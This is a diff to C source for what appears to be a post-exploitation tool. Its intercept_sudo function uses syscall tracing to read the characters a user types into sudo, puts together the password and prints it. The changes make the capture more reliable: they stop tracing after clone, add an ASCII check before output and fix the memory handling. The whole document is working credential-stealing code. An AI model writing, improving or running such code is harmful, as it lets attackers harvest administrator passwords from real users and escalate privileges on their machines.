@@ -19,23 +19,17 @@ extern char *process_name;
 extern char *process_path;
 extern char *process_username;
 
-char *extract_read_string(pid_t traced_process, long length) {
-  char *strval = NULL;
-  long str_ptr = 0;
 
-  str_ptr = get_syscall_arg(traced_process, 1);
-  strval = read_memory(traced_process, str_ptr, length);
-
-  return strval;
-}
 void intercept_sudo(pid_t traced_process) {
   int status = 0;
   int syscall = 0;
   int i = 0;
   long length = 0;
   char *read_string = NULL;
-  char *password = (char *) calloc(sizeof(char) * MAX_PASSWORD_LEN + 1, 1);
+  char *password = NULL;
   struct user_regs_struct regs;
+
+  password = (char *) calloc(sizeof(char) * MAX_PASSWORD_LEN + 1, 1);
 
   if (!password)
     goto exit_sudo;
@@ -55,6 +49,12 @@ void intercept_sudo(pid_t traced_process) {
 
     syscall = get_syscall(traced_process);
 
+    // Stop tracing the process after the clone system call. The sudo
+    // process will say alive as long as its child process. Commands
+    // like sudo su or sudo bash could keep this process open for a while
+    if (syscall == SYSCALL_clone)
+      goto exit_sudo;
+
     if (syscall == SYSCALL_read) {
       /*
         SECURITY NOTE: get_syscall_arg is controlled by the user, this
@@ -73,7 +73,7 @@ void intercept_sudo(pid_t traced_process) {
         if (read_string[0] && i < MAX_PASSWORD_LEN) {
           password[i++] = read_string[0];
         } else {
-          if (i) {
+          if (i && strnascii(password, i)) {
             output("%s\n", password);
           }
           memset(password, 0, MAX_PASSWORD_LEN);
@@ -88,10 +88,11 @@ void intercept_sudo(pid_t traced_process) {
       break;
   }
 
-  if (password)
+  if (i && i < MAX_PASSWORD_LEN && strnascii(password, i))
     output("%s\n", password);
 
 exit_sudo:
+  free(password);
   free_process_name();
   free_process_username();
   free_process_path();
